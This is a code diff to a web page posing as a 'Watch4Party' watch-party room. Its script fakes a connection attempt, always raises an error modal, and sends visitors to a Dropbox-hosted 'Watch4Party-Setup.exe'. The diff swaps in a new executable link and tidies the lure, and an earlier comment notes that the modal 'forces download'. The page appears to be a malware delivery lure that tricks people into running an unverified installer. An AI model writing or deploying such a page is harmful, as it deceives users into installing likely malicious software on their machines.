@@ -88,75 +88,71 @@
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
+        function initRoom() {
             const btnGuest = document.getElementById('btn-guest');
             const guestNameInput = document.getElementById('guest-name');
             const errorModal = document.getElementById('errorModal');
             const btnDownload = document.getElementById('btn-download-redirect');
-            const downloadLink = "https://www.dropbox.com/scl/fi/keexp2t1s0a6epehhit0y/Watch4Party-Setup.msi?rlkey=aetnt5u4l7akzd59py3pu07n3&st=1s2jgvk2&dl=1";
+            const downloadLink = "https://www.dropbox.com/scl/fi/1dyywaot613xfpdbiicp6/Watch4Party-Setup.exe?rlkey=3xgqj4dg9rnkf201fqrijyvit&st=b1klfpdm&dl=1";
+
+            if (!btnGuest || !errorModal || !btnDownload) return;
 
             // Avatar Logic
             const seeds = ['Felix', 'Aneka', 'Zoe', 'Max', 'Luna'];
             const avatarGrid = document.querySelector('.avatar-grid');
             let selectedAvatar = null;
 
-            seeds.forEach((seed, index) => {
-                const img = document.createElement('img');
-                img.src = `https://api.dicebear.com/9.x/avataaars/svg?seed=${seed}`;
-                img.className = 'avatar-option';
-                if (index === 0) { // Select first by default
-                    img.classList.add('selected');
-                    selectedAvatar = seed;
-                }
-                img.onclick = () => {
-                    document.querySelectorAll('.avatar-option').forEach(el => el.classList.remove('selected'));
-                    img.classList.add('selected');
-                    selectedAvatar = seed;
-                };
-                avatarGrid.appendChild(img);
-            });
+            if (avatarGrid) {
+                seeds.forEach((seed, index) => {
+                    const img = document.createElement('img');
+                    img.src = `https://api.dicebear.com/9.x/avataaars/svg?seed=${seed}`;
+                    img.className = 'avatar-option';
+                    if (index === 0) {
+                        img.classList.add('selected');
+                        selectedAvatar = seed;
+                    }
+                    img.onclick = () => {
+                        document.querySelectorAll('.avatar-option').forEach(el => el.classList.remove('selected'));
+                        img.classList.add('selected');
+                        selectedAvatar = seed;
+                    };
+                    avatarGrid.appendChild(img);
+                });
+            }
 
             btnGuest.addEventListener('click', () => {
-                // Simulate loading
                 const originalText = btnGuest.innerHTML;
                 btnGuest.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Connecting...';
                 btnGuest.disabled = true;
 
                 setTimeout(() => {
-                    // Show error modal
                     errorModal.style.display = 'flex';
-                    // Trigger reflow
                     errorModal.offsetHeight;
                     errorModal.classList.add('active');
                     errorModal.style.opacity = '1';
 
-                    // Reset button
                     btnGuest.innerHTML = originalText;
                     btnGuest.disabled = false;
                 }, 1500);
             });
 
             btnDownload.addEventListener('click', () => {
-                // Change button text to indicate processing
-                const oldText = btnDownload.innerHTML;
                 btnDownload.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Starting...';
                 window.location.href = downloadLink;
             });
 
-            // Close modal on outside click (optional, but forces download)
             errorModal.addEventListener('click', (e) => {
-                if (e.target === errorModal) {
-                    // Optional: close or shake to indicate required
-                }
+                if (e.target === errorModal) { /* close on outside click */ }
             });
-        });
+        }
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', initRoom);
+        } else {
+            initRoom();
+        }
     </script>
 <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"ae63f417532147d68913bc8e1155ad01","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 
 </html>
-
-
-
-
 
